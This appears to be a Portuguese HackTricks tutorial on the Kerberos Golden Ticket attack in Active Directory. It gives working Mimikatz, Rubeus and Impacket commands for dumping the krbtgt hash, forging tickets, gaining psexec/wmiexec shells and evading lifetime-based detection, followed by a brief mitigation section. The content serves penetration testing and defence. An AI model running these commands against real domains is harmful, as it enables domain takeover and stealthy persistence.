# Bilhete Dourado

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

## Bilhete Dourado

Um ataque de **Bilhete Dourado** consiste na **criação de um Ticket Granting Ticket (TGT) legítimo se passando por qualquer usuário** através do uso do **hash NTLM da conta krbtgt do Active Directory (AD)**. Essa técnica é particularmente vantajosa porque **permite acesso a qualquer serviço ou máquina** dentro do domínio como o usuário impostor. É crucial lembrar que as **credenciais da conta krbtgt nunca são atualizadas automaticamente**.

Para **adquirir o hash NTLM** da conta krbtgt, vários métodos podem ser empregados. Pode ser extraído do **processo Local Security Authority Subsystem Service (LSASS)** ou do arquivo **NT Directory Services (NTDS.dit)** localizado em qualquer Controlador de Domínio (DC) dentro do domínio. Além disso, **executar um ataque DCsync** é outra estratégia para obter esse hash NTLM, que pode ser realizado usando ferramentas como o **módulo lsadump::dcsync** no Mimikatz ou o **script secretsdump.py** da Impacket. É importante destacar que para realizar essas operações, **geralmente são necessários privilégios de administrador de domínio ou um nível de acesso semelhante**.

Embora o hash NTLM sirva como um método viável para esse fim, é **altamente recomendado** **forjar tickets usando as chaves de criptografia avançada do Padrão de Criptografia Avançada (AES) (AES128 e AES256)** por razões de segurança operacional.


{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Do Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Uma vez** que você tem o **Golden Ticket injetado**, você pode acessar os arquivos compartilhados **(C$)** e executar serviços e WMI, então você poderia usar **psexec** ou **wmiexec** para obter um shell (parece que você não pode obter um shell via winrm).

### Bypassando detecções comuns

As formas mais frequentes de detectar um golden ticket são **inspecionando o tráfego Kerberos** na rede. Por padrão, o Mimikatz **assina o TGT por 10 anos**, o que se destacará como anômalo em solicitações subsequentes de TGS feitas com ele.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use os parâmetros `/startoffset`, `/endin` e `/renewmax` para controlar o início do deslocamento, a duração e o número máximo de renovações (todos em minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Infelizmente, o tempo de vida do TGT não é registrado no 4769, então você não encontrará essa informação nos logs de eventos do Windows. No entanto, o que você pode correlacionar é **ver 4769's sem um 4768 anterior**. Não é possível solicitar um TGS sem um TGT e, se não houver registro de um TGT emitido, podemos inferir que foi forjado offline.

Para **burlar essa detecção**, verifique os tickets diamond:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigação

* 4624: Logon de Conta
* 4672: Logon de Administrador
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Outros truques que os defensores podem fazer são **alertar sobre 4769's para usuários sensíveis**, como a conta de administrador de domínio padrão.

## Referências
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
